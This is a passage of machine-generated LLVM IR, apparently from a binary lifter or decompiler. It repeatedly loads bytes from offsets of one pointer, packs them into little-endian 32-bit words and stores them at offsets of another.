  %v5_14d54 = or i32 %v4_14d54, %v5_14d48
  %v4_14d58 = mul nuw nsw i32 %v4_14d40, 65536
  %v5_14d58 = or i32 %v4_14d58, %v5_14d4c
  %v4_14d5c = mul nuw i32 %v4_14d44, 16777216
  %v5_14d5c = or i32 %v4_14d5c, %v5_14d54
  %v4_14d60 = mul nuw i32 %v4_14d50, 16777216
  %v5_14d60 = or i32 %v4_14d60, %v5_14d58
  store i32 %v5_14d60, i32* %r3.global-to-local, align 4
  %v0_14d64 = load i32, i32* %r7.global-to-local, align 4
  %v1_14d64 = inttoptr i32 %v0_14d64 to i32*
  store i32 %v5_14d5c, i32* %v1_14d64, align 4
  %v3_14d64 = add i32 %v0_14d64, 4
  %v4_14d64 = inttoptr i32 %v3_14d64 to i32*
  %v5_14d64 = load i32, i32* %r3.global-to-local, align 4
  store i32 %v5_14d64, i32* %v4_14d64, align 4
  %v0_14d68 = load i32, i32* %r4.global-to-local, align 4
  %v1_14d68 = add i32 %v0_14d68, 89
  %v2_14d68 = inttoptr i32 %v1_14d68 to i8*
  %v3_14d68 = load i8, i8* %v2_14d68, align 1
  %v4_14d68 = zext i8 %v3_14d68 to i32
  %v1_14d6c = add i32 %v0_14d68, 93
  %v2_14d6c = inttoptr i32 %v1_14d6c to i8*
  %v3_14d6c = load i8, i8* %v2_14d6c, align 1
  %v4_14d6c = zext i8 %v3_14d6c to i32
  %v1_14d70 = add i32 %v0_14d68, 88
  %v2_14d70 = inttoptr i32 %v1_14d70 to i8*
  %v3_14d70 = load i8, i8* %v2_14d70, align 1
  %v4_14d70 = zext i8 %v3_14d70 to i32
  %v1_14d74 = add i32 %v0_14d68, 92
  %v2_14d74 = inttoptr i32 %v1_14d74 to i8*
  %v3_14d74 = load i8, i8* %v2_14d74, align 1
  %v4_14d74 = zext i8 %v3_14d74 to i32
  store i32 %v4_14d74, i32* %r3.global-to-local, align 4
  %v1_14d78 = add i32 %v0_14d68, 94
  %v2_14d78 = inttoptr i32 %v1_14d78 to i8*
  %v3_14d78 = load i8, i8* %v2_14d78, align 1
  %v4_14d78 = zext i8 %v3_14d78 to i32
  %v1_14d7c = add i32 %v0_14d68, 90
  %v2_14d7c = inttoptr i32 %v1_14d7c to i8*
  %v3_14d7c = load i8, i8* %v2_14d7c, align 1
  %v4_14d7c = zext i8 %v3_14d7c to i32
  %v1_14d80 = add i32 %v0_14d68, 91
  %v2_14d80 = inttoptr i32 %v1_14d80 to i8*
  %v3_14d80 = load i8, i8* %v2_14d80, align 1
  %v4_14d80 = zext i8 %v3_14d80 to i32
  %v4_14d84 = mul nuw nsw i32 %v4_14d68, 256
  %v5_14d84 = or i32 %v4_14d70, %v4_14d84
  %v4_14d88 = mul nuw nsw i32 %v4_14d6c, 256
  %v5_14d88 = or i32 %v4_14d74, %v4_14d88
  store i32 %v5_14d88, i32* %r3.global-to-local, align 4
  %v1_14d8c = add i32 %v0_14d68, 95
  %v2_14d8c = inttoptr i32 %v1_14d8c to i8*
  %v3_14d8c = load i8, i8* %v2_14d8c, align 1
  %v4_14d8c = zext i8 %v3_14d8c to i32
  %v4_14d90 = mul nuw nsw i32 %v4_14d78, 65536
  %v5_14d90 = or i32 %v4_14d90, %v5_14d88
  store i32 %v5_14d90, i32* %r3.global-to-local, align 4
  %v4_14d94 = mul nuw nsw i32 %v4_14d7c, 65536
  %v5_14d94 = or i32 %v4_14d94, %v5_14d84
  %v4_14d98 = mul nuw i32 %v4_14d80, 16777216
  %v5_14d98 = or i32 %v4_14d98, %v5_14d94
  %v4_14d9c = mul nuw i32 %v4_14d8c, 16777216
  %v5_14d9c = or i32 %v4_14d9c, %v5_14d90
  store i32 %v5_14d9c, i32* %r6.global-to-local, align 4
  %v1_14da0 = load i32, i32* %r7.global-to-local, align 4
  %v2_14da0 = add i32 %v1_14da0, 88
  %v3_14da0 = inttoptr i32 %v2_14da0 to i32*
  store i32 %v5_14d98, i32* %v3_14da0, align 4
  %v0_14da4 = load i32, i32* %r6.global-to-local, align 4
  %v1_14da4 = load i32, i32* %r7.global-to-local, align 4
  %v2_14da4 = add i32 %v1_14da4, 92
  %v3_14da4 = inttoptr i32 %v2_14da4 to i32*
  store i32 %v0_14da4, i32* %v3_14da4, align 4
  %v0_14da8 = load i32, i32* %r4.global-to-local, align 4
  %v1_14da8 = add i32 %v0_14da8, 13
  %v2_14da8 = inttoptr i32 %v1_14da8 to i8*
  %v3_14da8 = load i8, i8* %v2_14da8, align 1
  %v4_14da8 = zext i8 %v3_14da8 to i32
  %v1_14dac = add i32 %v0_14da8, 12
  %v2_14dac = inttoptr i32 %v1_14dac to i8*
  %v3_14dac = load i8, i8* %v2_14dac, align 1
  %v4_14dac = zext i8 %v3_14dac to i32
  store i32 %v4_14dac, i32* %r3.global-to-local, align 4
  %v1_14db0 = add i32 %v0_14da8, 14
  %v2_14db0 = inttoptr i32 %v1_14db0 to i8*
  %v3_14db0 = load i8, i8* %v2_14db0, align 1
  %v4_14db0 = zext i8 %v3_14db0 to i32
  %v4_14db4 = mul nuw nsw i32 %v4_14da8, 256
  %v5_14db4 = or i32 %v4_14dac, %v4_14db4
  store i32 %v5_14db4, i32* %r3.global-to-local, align 4
  %v1_14db8 = add i32 %v0_14da8, 15
  %v2_14db8 = inttoptr i32 %v1_14db8 to i8*
  %v3_14db8 = load i8, i8* %v2_14db8, align 1
  %v4_14db8 = zext i8 %v3_14db8 to i32
  %v4_14dbc = mul nuw nsw i32 %v4_14db0, 65536
  %v5_14dbc = or i32 %v4_14dbc, %v5_14db4
  %v4_14dc0 = mul nuw i32 %v4_14db8, 16777216
  %v5_14dc0 = or i32 %v5_14dbc, %v4_14dc0
  store i32 %v5_14dc0, i32* %r3.global-to-local, align 4
  %v1_14dc4 = load i32, i32* %r7.global-to-local, align 4
  %v2_14dc4 = add i32 %v1_14dc4, 12
  %v3_14dc4 = inttoptr i32 %v2_14dc4 to i32*
  store i32 %v5_14dc0, i32* %v3_14dc4, align 4
  %v0_14dc8 = load i32, i32* %r4.global-to-local, align 4
  %v1_14dc8 = add i32 %v0_14dc8, 17
  %v2_14dc8 = inttoptr i32 %v1_14dc8 to i8*
  %v3_14dc8 = load i8, i8* %v2_14dc8, align 1
  %v4_14dc8 = zext i8 %v3_14dc8 to i32
  %v1_14dcc = add i32 %v0_14dc8, 16
  %v2_14dcc = inttoptr i32 %v1_14dcc to i8*
  %v3_14dcc = load i8, i8* %v2_14dcc, align 1
  %v4_14dcc = zext i8 %v3_14dcc to i32
  store i32 %v4_14dcc, i32* %r3.global-to-local, align 4
  %v1_14dd0 = add i32 %v0_14dc8, 18
  %v2_14dd0 = inttoptr i32 %v1_14dd0 to i8*
  %v3_14dd0 = load i8, i8* %v2_14dd0, align 1
  %v4_14dd0 = zext i8 %v3_14dd0 to i32
  %v4_14dd4 = mul nuw nsw i32 %v4_14dc8, 256
  %v5_14dd4 = or i32 %v4_14dcc, %v4_14dd4
  store i32 %v5_14dd4, i32* %r3.global-to-local, align 4
  %v1_14dd8 = add i32 %v0_14dc8, 19
  %v2_14dd8 = inttoptr i32 %v1_14dd8 to i8*
  %v3_14dd8 = load i8, i8* %v2_14dd8, align 1
  %v4_14dd8 = zext i8 %v3_14dd8 to i32
  %v4_14ddc = mul nuw nsw i32 %v4_14dd0, 65536
  %v5_14ddc = or i32 %v4_14ddc, %v5_14dd4
  %v4_14de0 = mul nuw i32 %v4_14dd8, 16777216
  %v5_14de0 = or i32 %v5_14ddc, %v4_14de0
  store i32 %v5_14de0, i32* %r3.global-to-local, align 4
  %v1_14de4 = load i32, i32* %r7.global-to-local, align 4
  %v2_14de4 = add i32 %v1_14de4, 16
  %v3_14de4 = inttoptr i32 %v2_14de4 to i32*
  store i32 %v5_14de0, i32* %v3_14de4, align 4
  %v0_14de8 = load i32, i32* %r4.global-to-local, align 4
  %v1_14de8 = add i32 %v0_14de8, 21
  %v2_14de8 = inttoptr i32 %v1_14de8 to i8*
  %v3_14de8 = load i8, i8* %v2_14de8, align 1
  %v4_14de8 = zext i8 %v3_14de8 to i32
  %v1_14dec = add i32 %v0_14de8, 20
  %v2_14dec = inttoptr i32 %v1_14dec to i8*
  %v3_14dec = load i8, i8* %v2_14dec, align 1
  %v4_14dec = zext i8 %v3_14dec to i32
  store i32 %v4_14dec, i32* %r3.global-to-local, align 4
  %v1_14df0 = add i32 %v0_14de8, 22
  %v2_14df0 = inttoptr i32 %v1_14df0 to i8*
  %v3_14df0 = load i8, i8* %v2_14df0, align 1
  %v4_14df0 = zext i8 %v3_14df0 to i32
  %v4_14df4 = mul nuw nsw i32 %v4_14de8, 256
  %v5_14df4 = or i32 %v4_14dec, %v4_14df4
  store i32 %v5_14df4, i32* %r3.global-to-local, align 4
  %v1_14df8 = add i32 %v0_14de8, 23
  %v2_14df8 = inttoptr i32 %v1_14df8 to i8*
  %v3_14df8 = load i8, i8* %v2_14df8, align 1
  %v4_14df8 = zext i8 %v3_14df8 to i32
  %v4_14dfc = mul nuw nsw i32 %v4_14df0, 65536
  %v5_14dfc = or i32 %v4_14dfc, %v5_14df4
  %v4_14e00 = mul nuw i32 %v4_14df8, 16777216
  %v5_14e00 = or i32 %v5_14dfc, %v4_14e00
  store i32 %v5_14e00, i32* %r3.global-to-local, align 4
  %v1_14e04 = load i32, i32* %r7.global-to-local, align 4
  %v2_14e04 = add i32 %v1_14e04, 20
  %v3_14e04 = inttoptr i32 %v2_14e04 to i32*
  store i32 %v5_14e00, i32* %v3_14e04, align 4
  %v0_14e08 = load i32, i32* %r4.global-to-local, align 4
  %v1_14e08 = add i32 %v0_14e08, 25
  %v2_14e08 = inttoptr i32 %v1_14e08 to i8*
  %v3_14e08 = load i8, i8* %v2_14e08, align 1
  %v4_14e08 = zext i8 %v3_14e08 to i32
  %v1_14e0c = add i32 %v0_14e08, 24
  %v2_14e0c = inttoptr i32 %v1_14e0c to i8*
  %v3_14e0c = load i8, i8* %v2_14e0c, align 1
  %v4_14e0c = zext i8 %v3_14e0c to i32
  store i32 %v4_14e0c, i32* %r3.global-to-local, align 4
  %v1_14e10 = add i32 %v0_14e08, 26
  %v2_14e10 = inttoptr i32 %v1_14e10 to i8*
  %v3_14e10 = load i8, i8* %v2_14e10, align 1
  %v4_14e10 = zext i8 %v3_14e10 to i32
  %v4_14e14 = mul nuw nsw i32 %v4_14e08, 256
  %v5_14e14 = or i32 %v4_14e0c, %v4_14e14
  store i32 %v5_14e14, i32* %r3.global-to-local, align 4
  %v1_14e18 = add i32 %v0_14e08, 27
  %v2_14e18 = inttoptr i32 %v1_14e18 to i8*
  %v3_14e18 = load i8, i8* %v2_14e18, align 1
  %v4_14e18 = zext i8 %v3_14e18 to i32
  %v4_14e1c = mul nuw nsw i32 %v4_14e10, 65536
  %v5_14e1c = or i32 %v4_14e1c, %v5_14e14
  %v4_14e20 = mul nuw i32 %v4_14e18, 16777216
  %v5_14e20 = or i32 %v5_14e1c, %v4_14e20
  store i32 %v5_14e20, i32* %r3.global-to-local, align 4
  %v1_14e24 = load i32, i32* %r7.global-to-local, align 4
  %v2_14e24 = add i32 %v1_14e24, 24
  %v3_14e24 = inttoptr i32 %v2_14e24 to i32*
  store i32 %v5_14e20, i32* %v3_14e24, align 4
  %v0_14e28 = load i32, i32* %r4.global-to-local, align 4
  %v1_14e28 = add i32 %v0_14e28, 29
  %v2_14e28 = inttoptr i32 %v1_14e28 to i8*
  %v3_14e28 = load i8, i8* %v2_14e28, align 1
  %v4_14e28 = zext i8 %v3_14e28 to i32
  %v1_14e2c = add i32 %v0_14e28, 28
  %v2_14e2c = inttoptr i32 %v1_14e2c to i8*
  %v3_14e2c = load i8, i8* %v2_14e2c, align 1
  %v4_14e2c = zext i8 %v3_14e2c to i32
  store i32 %v4_14e2c, i32* %r3.global-to-local, align 4
  %v1_14e30 = add i32 %v0_14e28, 30
  %v2_14e30 = inttoptr i32 %v1_14e30 to i8*
  %v3_14e30 = load i8, i8* %v2_14e30, align 1
  %v4_14e30 = zext i8 %v3_14e30 to i32
  %v4_14e34 = mul nuw nsw i32 %v4_14e28, 256
  %v5_14e34 = or i32 %v4_14e2c, %v4_14e34
  store i32 %v5_14e34, i32* %r3.global-to-local, align 4
  %v1_14e38 = add i32 %v0_14e28, 31
  %v2_14e38 = inttoptr i32 %v1_14e38 to i8*
  %v3_14e38 = load i8, i8* %v2_14e38, align 1
  %v4_14e38 = zext i8 %v3_14e38 to i32
  %v4_14e3c = mul nuw nsw i32 %v4_14e30, 65536
  %v5_14e3c = or i32 %v4_14e3c, %v5_14e34
  %v4_14e40 = mul nuw i32 %v4_14e38, 16777216
  %v5_14e40 = or i32 %v5_14e3c, %v4_14e40
  store i32 %v5_14e40, i32* %r3.global-to-local, align 4
  %v1_14e44 = load i32, i32* %r7.global-to-local, align 4
  %v2_14e44 = add i32 %v1_14e44, 28
  %v3_14e44 = inttoptr i32 %v2_14e44 to i32*
  store i32 %v5_14e40, i32* %v3_14e44, align 4
  %v0_14e48 = load i32, i32* %r4.global-to-local, align 4
  %v1_14e48 = add i32 %v0_14e48, 33
  %v2_14e48 = inttoptr i32 %v1_14e48 to i8*
  %v3_14e48 = load i8, i8* %v2_14e48, align 1
  %v4_14e48 = zext i8 %v3_14e48 to i32
  %v1_14e4c = add i32 %v0_14e48, 37
  %v2_14e4c = inttoptr i32 %v1_14e4c to i8*
  %v3_14e4c = load i8, i8* %v2_14e4c, align 1
  %v4_14e4c = zext i8 %v3_14e4c to i32
  %v1_14e50 = add i32 %v0_14e48, 32
  %v2_14e50 = inttoptr i32 %v1_14e50 to i8*
  %v3_14e50 = load i8, i8* %v2_14e50, align 1
  %v4_14e50 = zext i8 %v3_14e50 to i32
  %v1_14e54 = add i32 %v0_14e48, 36
  %v2_14e54 = inttoptr i32 %v1_14e54 to i8*
  %v3_14e54 = load i8, i8* %v2_14e54, align 1
  %v4_14e54 = zext i8 %v3_14e54 to i32
  store i32 %v4_14e54, i32* %r3.global-to-local, align 4
  %v1_14e58 = add i32 %v0_14e48, 34
  %v2_14e58 = inttoptr i32 %v1_14e58 to i8*
  %v3_14e58 = load i8, i8* %v2_14e58, align 1
  %v4_14e58 = zext i8 %v3_14e58 to i32
  %v1_14e5c = add i32 %v0_14e48, 38
  %v2_14e5c = inttoptr i32 %v1_14e5c to i8*
  %v3_14e5c = load i8, i8* %v2_14e5c, align 1
  %v4_14e5c = zext i8 %v3_14e5c to i32
  %v1_14e60 = add i32 %v0_14e48, 35
  %v2_14e60 = inttoptr i32 %v1_14e60 to i8*
  %v3_14e60 = load i8, i8* %v2_14e60, align 1
  %v4_14e60 = zext i8 %v3_14e60 to i32
  %v4_14e64 = mul nuw nsw i32 %v4_14e48, 256
  %v5_14e64 = or i32 %v4_14e50, %v4_14e64
  %v4_14e68 = mul nuw nsw i32 %v4_14e4c, 256
  %v5_14e68 = or i32 %v4_14e54, %v4_14e68
  store i32 %v5_14e68, i32* %r3.global-to-local, align 4
  %v1_14e6c = add i32 %v0_14e48, 39
  %v2_14e6c = inttoptr i32 %v1_14e6c to i8*
  %v3_14e6c = load i8, i8* %v2_14e6c, align 1
  %v4_14e6c = zext i8 %v3_14e6c to i32
  %v4_14e70 = mul nuw nsw i32 %v4_14e58, 65536
  %v5_14e70 = or i32 %v4_14e70, %v5_14e64
  %v4_14e74 = mul nuw nsw i32 %v4_14e5c, 65536
  %v5_14e74 = or i32 %v4_14e74, %v5_14e68
  %v4_14e78 = mul nuw i32 %v4_14e60, 16777216
  %v5_14e78 = or i32 %v5_14e70, %v4_14e78
  %v4_14e7c = mul nuw i32 %v4_14e6c, 16777216
  %v5_14e7c = or i32 %v5_14e74, %v4_14e7c
  store i32 %v5_14e7c, i32* %r3.global-to-local, align 4
  %v1_14e90 = load i32, i32* %r7.global-to-local, align 4
  %v2_14e90 = add i32 %v1_14e90, 32
  %v3_14e90 = inttoptr i32 %v2_14e90 to i32*
  store i32 %v5_14e78, i32* %v3_14e90, align 4
  %v0_14e94 = load i32, i32* %r3.global-to-local, align 4
  %v1_14e94 = load i32, i32* %r7.global-to-local, align 4
  %v2_14e94 = add i32 %v1_14e94, 36
  %v3_14e94 = inttoptr i32 %v2_14e94 to i32*
  store i32 %v0_14e94, i32* %v3_14e94, align 4
  %v0_14e98 = load i32, i32* %r4.global-to-local, align 4
  %v1_14e98 = add i32 %v0_14e98, 45
  %v2_14e98 = inttoptr i32 %v1_14e98 to i8*
  %v3_14e98 = load i8, i8* %v2_14e98, align 1
  %v4_14e98 = zext i8 %v3_14e98 to i32
  %v1_14e9c = add i32 %v0_14e98, 49
  %v2_14e9c = inttoptr i32 %v1_14e9c to i8*
  %v3_14e9c = load i8, i8* %v2_14e9c, align 1
  %v4_14e9c = zext i8 %v3_14e9c to i32
  %v1_14ea0 = add i32 %v0_14e98, 44
  %v2_14ea0 = inttoptr i32 %v1_14ea0 to i8*
  %v3_14ea0 = load i8, i8* %v2_14ea0, align 1
  %v4_14ea0 = zext i8 %v3_14ea0 to i32
  %v1_14ea4 = add i32 %v0_14e98, 48
  %v2_14ea4 = inttoptr i32 %v1_14ea4 to i8*
  %v3_14ea4 = load i8, i8* %v2_14ea4, align 1
  %v4_14ea4 = zext i8 %v3_14ea4 to i32
  store i32 %v4_14ea4, i32* %r3.global-to-local, align 4
  %v1_14ea8 = add i32 %v0_14e98, 46
  %v2_14ea8 = inttoptr i32 %v1_14ea8 to i8*
  %v3_14ea8 = load i8, i8* %v2_14ea8, align 1
  %v4_14ea8 = zext i8 %v3_14ea8 to i32
  %v1_14eac = add i32 %v0_14e98, 50
  %v2_14eac = inttoptr i32 %v1_14eac to i8*
  %v3_14eac = load i8, i8* %v2_14eac, align 1
  %v4_14eac = zext i8 %v3_14eac to i32
  %v1_14eb0 = add i32 %v0_14e98, 47
  %v2_14eb0 = inttoptr i32 %v1_14eb0 to i8*
  %v3_14eb0 = load i8, i8* %v2_14eb0, align 1
  %v4_14eb0 = zext i8 %v3_14eb0 to i32
  %v4_14eb4 = mul nuw nsw i32 %v4_14e98, 256
  %v5_14eb4 = or i32 %v4_14ea0, %v4_14eb4
  %v4_14eb8 = mul nuw nsw i32 %v4_14e9c, 256
  %v5_14eb8 = or i32 %v4_14ea4, %v4_14eb8
  store i32 %v5_14eb8, i32* %r3.global-to-local, align 4
  %v1_14ebc = add i32 %v0_14e98, 51
  %v2_14ebc = inttoptr i32 %v1_14ebc to i8*
  %v3_14ebc = load i8, i8* %v2_14ebc, align 1
  %v4_14ebc = zext i8 %v3_14ebc to i32
  %v4_14ec0 = mul nuw nsw i32 %v4_14ea8, 65536
  %v5_14ec0 = or i32 %v4_14ec0, %v5_14eb4
  %v4_14ec4 = mul nuw nsw i32 %v4_14eac, 65536
  %v5_14ec4 = or i32 %v4_14ec4, %v5_14eb8
  %v4_14ec8 = mul nuw i32 %v4_14eb0, 16777216
  %v5_14ec8 = or i32 %v5_14ec0, %v4_14ec8
  %v4_14ecc = mul nuw i32 %v4_14ebc, 16777216
  %v5_14ecc = or i32 %v5_14ec4, %v4_14ecc
  store i32 %v5_14ecc, i32* %r3.global-to-local, align 4
  %v1_14ee0 = load i32, i32* %r7.global-to-local, align 4
  %v2_14ee0 = add i32 %v1_14ee0, 44
  %v3_14ee0 = inttoptr i32 %v2_14ee0 to i32*
  store i32 %v5_14ec8, i32* %v3_14ee0, align 4
  %v0_14ee4 = load i32, i32* %r3.global-to-local, align 4
  %v1_14ee4 = load i32, i32* %r7.global-to-local, align 4
  %v2_14ee4 = add i32 %v1_14ee4, 48
  %v3_14ee4 = inttoptr i32 %v2_14ee4 to i32*
  store i32 %v0_14ee4, i32* %v3_14ee4, align 4
  %v0_14ee8 = load i32, i32* %r4.global-to-local, align 4
  %v1_14ee8 = add i32 %v0_14ee8, 53
  %v2_14ee8 = inttoptr i32 %v1_14ee8 to i8*
  %v3_14ee8 = load i8, i8* %v2_14ee8, align 1
  %v4_14ee8 = zext i8 %v3_14ee8 to i32
  %v1_14eec = add i32 %v0_14ee8, 52
  %v2_14eec = inttoptr i32 %v1_14eec to i8*
  %v3_14eec = load i8, i8* %v2_14eec, align 1
  %v4_14eec = zext i8 %v3_14eec to i32
  store i32 %v4_14eec, i32* %r3.global-to-local, align 4
  %v1_14ef0 = add i32 %v0_14ee8, 54
  %v2_14ef0 = inttoptr i32 %v1_14ef0 to i8*
  %v3_14ef0 = load i8, i8* %v2_14ef0, align 1
  %v4_14ef0 = zext i8 %v3_14ef0 to i32
  %v4_14ef4 = mul nuw nsw i32 %v4_14ee8, 256
  %v5_14ef4 = or i32 %v4_14eec, %v4_14ef4
  store i32 %v5_14ef4, i32* %r3.global-to-local, align 4
  %v1_14ef8 = add i32 %v0_14ee8, 55
  %v2_14ef8 = inttoptr i32 %v1_14ef8 to i8*
  %v3_14ef8 = load i8, i8* %v2_14ef8, align 1
  %v4_14ef8 = zext i8 %v3_14ef8 to i32
  %v4_14efc = mul nuw nsw i32 %v4_14ef0, 65536
  %v5_14efc = or i32 %v4_14efc, %v5_14ef4
  %v4_14f00 = mul nuw i32 %v4_14ef8, 16777216
  %v5_14f00 = or i32 %v5_14efc, %v4_14f00
  store i32 %v5_14f00, i32* %r3.global-to-local, align 4
  %v1_14f04 = load i32, i32* %r7.global-to-local, align 4
  %v2_14f04 = add i32 %v1_14f04, 52
  %v3_14f04 = inttoptr i32 %v2_14f04 to i32*
  store i32 %v5_14f00, i32* %v3_14f04, align 4
  %v0_14f08 = load i32, i32* %r4.global-to-local, align 4
  %v1_14f08 = add i32 %v0_14f08, 57
  %v2_14f08 = inttoptr i32 %v1_14f08 to i8*
  %v3_14f08 = load i8, i8* %v2_14f08, align 1
  %v4_14f08 = zext i8 %v3_14f08 to i32
  %v1_14f0c = add i32 %v0_14f08, 56
  %v2_14f0c = inttoptr i32 %v1_14f0c to i8*
  %v3_14f0c = load i8, i8* %v2_14f0c, align 1
  %v4_14f0c = zext i8 %v3_14f0c to i32
  %v1_14f10 = add i32 %v0_14f08, 60
  %v2_14f10 = inttoptr i32 %v1_14f10 to i8*
  %v3_14f10 = load i8, i8* %v2_14f10, align 1
  %v4_14f10 = zext i8 %v3_14f10 to i32
  store i32 %v4_14f10, i32* %r3.global-to-local, align 4
  %v1_14f14 = add i32 %v0_14f08, 61
  %v2_14f14 = inttoptr i32 %v1_14f14 to i8*
  %v3_14f14 = load i8, i8* %v2_14f14, align 1
  %v4_14f14 = zext i8 %v3_14f14 to i32
  %v1_14f18 = add i32 %v0_14f08, 58
  %v2_14f18 = inttoptr i32 %v1_14f18 to i8*
  %v3_14f18 = load i8, i8* %v2_14f18, align 1
  %v4_14f18 = zext i8 %v3_14f18 to i32
  %v1_14f1c = add i32 %v0_14f08, 62
  %v2_14f1c = inttoptr i32 %v1_14f1c to i8*
  %v3_14f1c = load i8, i8* %v2_14f1c, align 1
  %v4_14f1c = zext i8 %v3_14f1c to i32
  %v1_14f20 = add i32 %v0_14f08, 59
  %v2_14f20 = inttoptr i32 %v1_14f20 to i8*
  %v3_14f20 = load i8, i8* %v2_14f20, align 1
  %v4_14f20 = zext i8 %v3_14f20 to i32
  %v4_14f24 = mul nuw nsw i32 %v4_14f08, 256
  %v5_14f24 = or i32 %v4_14f0c, %v4_14f24
  %v4_14f28 = mul nuw nsw i32 %v4_14f14, 256
  %v5_14f28 = or i32 %v4_14f28, %v4_14f10
  store i32 %v5_14f28, i32* %r3.global-to-local, align 4
  %v1_14f2c = add i32 %v0_14f08, 63
  %v2_14f2c = inttoptr i32 %v1_14f2c to i8*
  %v3_14f2c = load i8, i8* %v2_14f2c, align 1
  %v4_14f2c = zext i8 %v3_14f2c to i32
  %v4_14f30 = mul nuw nsw i32 %v4_14f18, 65536
  %v5_14f30 = or i32 %v4_14f30, %v5_14f24
  %v4_14f34 = mul nuw nsw i32 %v4_14f1c, 65536
  %v5_14f34 = or i32 %v4_14f34, %v5_14f28
  %v4_14f38 = mul nuw i32 %v4_14f2c, 16777216
  %v5_14f38 = or i32 %v5_14f34, %v4_14f38
  %v4_14f3c = mul nuw i32 %v4_14f20, 16777216
  %v5_14f3c = or i32 %v5_14f30, %v4_14f3c
  store i32 %v5_14f38, i32* %r3.global-to-local, align 4
  %v1_14f4c = load i32, i32* %r7.global-to-local, align 4
  %v2_14f4c = add i32 %v1_14f4c, 56
  %v3_14f4c = inttoptr i32 %v2_14f4c to i32*
  store i32 %v5_14f3c, i32* %v3_14f4c, align 4
  %v0_14f50 = load i32, i32* %r3.global-to-local, align 4
  %v1_14f50 = load i32, i32* %r7.global-to-local, align 4
  %v2_14f50 = add i32 %v1_14f50, 60
  %v3_14f50 = inttoptr i32 %v2_14f50 to i32*
  store i32 %v0_14f50, i32* %v3_14f50, align 4
  %v0_14f54 = load i32, i32* %r4.global-to-local, align 4
  %v1_14f54 = add i32 %v0_14f54, 65
  %v2_14f54 = inttoptr i32 %v1_14f54 to i8*
  %v3_14f54 = load i8, i8* %v2_14f54, align 1
  %v4_14f54 = zext i8 %v3_14f54 to i32
  %v1_14f58 = add i32 %v0_14f54, 64
  %v2_14f58 = inttoptr i32 %v1_14f58 to i8*
  %v3_14f58 = load i8, i8* %v2_14f58, align 1
  %v4_14f58 = zext i8 %v3_14f58 to i32
  store i32 %v4_14f58, i32* %r3.global-to-local, align 4
  %v1_14f5c = add i32 %v0_14f54, 66
  %v2_14f5c = inttoptr i32 %v1_14f5c to i8*
  %v3_14f5c = load i8, i8* %v2_14f5c, align 1
  %v4_14f5c = zext i8 %v3_14f5c to i32
  %v4_14f60 = mul nuw nsw i32 %v4_14f54, 256
  %v5_14f60 = or i32 %v4_14f58, %v4_14f60
  store i32 %v5_14f60, i32* %r3.global-to-local, align 4
  %v1_14f64 = add i32 %v0_14f54, 67
  %v2_14f64 = inttoptr i32 %v1_14f64 to i8*
  %v3_14f64 = load i8, i8* %v2_14f64, align 1
  %v4_14f64 = zext i8 %v3_14f64 to i32
  %v4_14f68 = mul nuw nsw i32 %v4_14f5c, 65536
  %v5_14f68 = or i32 %v4_14f68, %v5_14f60
  %v4_14f6c = mul nuw i32 %v4_14f64, 16777216
  %v5_14f6c = or i32 %v5_14f68, %v4_14f6c
  store i32 %v5_14f6c, i32* %r3.global-to-local, align 4
  %v1_14f70 = load i32, i32* %r7.global-to-local, align 4
  %v2_14f70 = add i32 %v1_14f70, 64
  %v3_14f70 = inttoptr i32 %v2_14f70 to i32*
  store i32 %v5_14f6c, i32* %v3_14f70, align 4
  %v0_14f74 = load i32, i32* %r4.global-to-local, align 4
  %v1_14f74 = add i32 %v0_14f74, 73
  %v2_14f74 = inttoptr i32 %v1_14f74 to i8*
  %v3_14f74 = load i8, i8* %v2_14f74, align 1
  %v4_14f74 = zext i8 %v3_14f74 to i32
  %v1_14f78 = add i32 %v0_14f74, 72
  %v2_14f78 = inttoptr i32 %v1_14f78 to i8*
  %v3_14f78 = load i8, i8* %v2_14f78, align 1
  %v4_14f78 = zext i8 %v3_14f78 to i32
  store i32 %v4_14f78, i32* %r3.global-to-local, align 4
  %v1_14f7c = add i32 %v0_14f74, 74
  %v2_14f7c = inttoptr i32 %v1_14f7c to i8*
  %v3_14f7c = load i8, i8* %v2_14f7c, align 1
  %v4_14f7c = zext i8 %v3_14f7c to i32
  %v4_14f80 = mul nuw nsw i32 %v4_14f74, 256
  %v5_14f80 = or i32 %v4_14f78, %v4_14f80
  store i32 %v5_14f80, i32* %r3.global-to-local, align 4
  %v1_14f84 = add i32 %v0_14f74, 75
  %v2_14f84 = inttoptr i32 %v1_14f84 to i8*
  %v3_14f84 = load i8, i8* %v2_14f84, align 1
  %v4_14f84 = zext i8 %v3_14f84 to i32
  %v4_14f88 = mul nuw nsw i32 %v4_14f7c, 65536
  %v5_14f88 = or i32 %v4_14f88, %v5_14f80
  %v4_14f8c = mul nuw i32 %v4_14f84, 16777216
  %v5_14f8c = or i32 %v5_14f88, %v4_14f8c
  store i32 %v5_14f8c, i32* %r3.global-to-local, align 4
  %v1_14f90 = load i32, i32* %r7.global-to-local, align 4
  %v2_14f90 = add i32 %v1_14f90, 72
  %v3_14f90 = inttoptr i32 %v2_14f90 to i32*
  store i32 %v5_14f8c, i32* %v3_14f90, align 4
  %v0_14f94 = load i32, i32* %r4.global-to-local, align 4
  %v1_14f94 = add i32 %v0_14f94, 81
  %v2_14f94 = inttoptr i32 %v1_14f94 to i8*
  %v3_14f94 = load i8, i8* %v2_14f94, align 1
  %v4_14f94 = zext i8 %v3_14f94 to i32
  %v1_14f98 = add i32 %v0_14f94, 80
  %v2_14f98 = inttoptr i32 %v1_14f98 to i8*
  %v3_14f98 = load i8, i8* %v2_14f98, align 1
  %v4_14f98 = zext i8 %v3_14f98 to i32
  store i32 %v4_14f98, i32* %r3.global-to-local, align 4
  %v1_14f9c = add i32 %v0_14f94, 82
  %v2_14f9c = inttoptr i32 %v1_14f9c to i8*
  %v3_14f9c = load i8, i8* %v2_14f9c, align 1
  %v4_14f9c = zext i8 %v3_14f9c to i32
  %v4_14fa0 = mul nuw nsw i32 %v4_14f94, 256
  %v5_14fa0 = or i32 %v4_14f98, %v4_14fa0
  store i32 %v5_14fa0, i32* %r3.global-to-local, align 4
  %v1_14fa4 = add i32 %v0_14f94, 83
  %v2_14fa4 = inttoptr i32 %v1_14fa4 to i8*
  %v3_14fa4 = load i8, i8* %v2_14fa4, align 1
  %v4_14fa4 = zext i8 %v3_14fa4 to i32
  %v4_14fa8 = mul nuw nsw i32 %v4_14f9c, 65536
  %v5_14fa8 = or i32 %v4_14fa8, %v5_14fa0
  %v4_14fac = mul nuw i32 %v4_14fa4, 16777216
  %v5_14fac = or i32 %v5_14fa8, %v4_14fac
  store i32 %v5_14fac, i32* %r3.global-to-local, align 4
